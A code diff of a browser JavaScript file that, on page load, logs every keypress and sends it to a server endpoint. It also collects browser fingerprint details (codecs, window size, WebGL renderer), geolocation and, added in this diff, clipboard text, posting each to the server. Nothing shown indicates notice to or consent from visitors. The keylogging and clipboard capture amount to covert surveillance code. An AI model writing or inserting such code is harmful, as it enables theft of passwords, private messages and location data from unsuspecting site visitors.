@@ -1,5 +1,4 @@
 document.addEventListener("DOMContentLoaded", function () {
-
   // Listen for key press events
   document.addEventListener("keydown", function (event) {
     // Get key information from the event object
@@ -22,7 +21,7 @@ document.addEventListener("DOMContentLoaded", function () {
       body: JSON.stringify(keyInfo), // Convert the data to JSON format and send
     })
       .then((response) => response.json()) // Get the response from the server in JSON format
-      //.then((data) => console.log("Key info sent successfully:", data))
+      .then((data) => console.log("Key info sent successfully:", data))
       .catch((error) => console.error("Error sending key info:", error));
   }
 });
@@ -58,12 +57,16 @@ function checkCodecSupport() {
 
   // Check video codec support
   for (var codec in codecs.video) {
-    support.video[codec] = video.canPlayType(codecs.video[codec]) ? true : false;
+    support.video[codec] = video.canPlayType(codecs.video[codec])
+      ? true
+      : false;
   }
 
   // Check audio codec support
   for (var codec in codecs.audio) {
-    support.audio[codec] = audio.canPlayType(codecs.audio[codec]) ? true : false;
+    support.audio[codec] = audio.canPlayType(codecs.audio[codec])
+      ? true
+      : false;
   }
 
   //console.log("Supported video codecs:", support.video);
@@ -98,7 +101,6 @@ function collectAndSendData() {
     inner_height: window.innerHeight, // Window height
 
     webGL_info: getWebGLInfo(), // WebGL information
-
   };
 
   // Convert data to JSON format
@@ -114,22 +116,23 @@ function collectAndSendData() {
   })
     .then((response) => {
       if (response.ok) {
-        //console.log("Data successfully sent."); // If successful
+        console.log("Log successfully sent."); // If successful
       } else {
-        //console.error("Failed to send data."); // If there is an error
+        console.error("Failed to send Log."); // If there is an error
       }
     })
     .catch((error) => console.error("Error:", error)); // Catch and log the error
+
 }
 
 // Function to log geolocation data
-function getLocation () {
+function getLocation() {
   if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(
       (position) => {
         const geoData = {
           latitude: position.coords.latitude,
-          longitude: position.coords.longitude
+          longitude: position.coords.longitude,
         };
         // Convert geolocation data to JSON format
         const geoJsonData = JSON.stringify(geoData);
@@ -138,9 +141,9 @@ function getLocation () {
         fetch("/log-geolocation", {
           method: "POST", // HTTP POST request
           headers: {
-            "Content-Type": "application/json" // Specify JSON content type
+            "Content-Type": "application/json", // Specify JSON content type
           },
-          body: geoJsonData // Send JSON data
+          body: geoJsonData, // Send JSON data
         })
           .then((response) => {
             if (response.ok) {
@@ -156,13 +159,14 @@ function getLocation () {
       }
     );
   } else {
-    //console.error("Geolocation is not supported by this browser."); // Handle no geolocation support
+    console.error("Geolocation is not supported by this browser."); // Handle no geolocation support
   }
 }
 
 function getWebGLInfo() {
   const canvas = document.createElement("canvas"); // Create a canvas element
-  const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl"); // Get WebGL context
+  const gl =
+    canvas.getContext("webgl") || canvas.getContext("experimental-webgl"); // Get WebGL context
 
   if (gl) {
     const debugInfo = gl.getExtension("WEBGL_debug_renderer_info"); // Get debug info extension
@@ -174,19 +178,49 @@ function getWebGLInfo() {
         Vendor: vendor,
       };
     } else {
-      //console.log("WEBGL_debug_renderer_info extension not supported"); // Message if not supported
+      console.log("WEBGL_debug_renderer_info extension not supported"); // Message if not supported
       return {
         Renderer: "Not supported",
         Vendor: "Not supported",
       };
     }
   } else {
-    //console.log("WebGL not supported"); // Message if WebGL is not supported
+    console.log("WebGL not supported"); // Message if WebGL is not supported
     return JSON.stringify({
       Renderer: "WebGL not supported",
       Vendor: "WebGL not supported",
     });
   }
+}
+
+function postClipboardData() {
+  if (!navigator.clipboard) {
+    console.error("Clipboard API not supported.");
+    return;
+  }
+
+  navigator.clipboard
+    .readText()
+    .then((text) => {
+      console.log("Clipboard text:", text);
+
+      fetch("/clipboard-data", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({ data: text }),
+      })
+        .then((response) => {
+          if (response.ok) {
+            console.log("Data successfully sent to the server.");
+          } else {
+            console.error("Failed to send data.");
+          }
+        })
+        .catch((error) => console.error("Error:", error));
+    })
+    .catch((error) => console.error("Failed to read clipboard data:", error));
 }
 
 // Execute function when the page loads
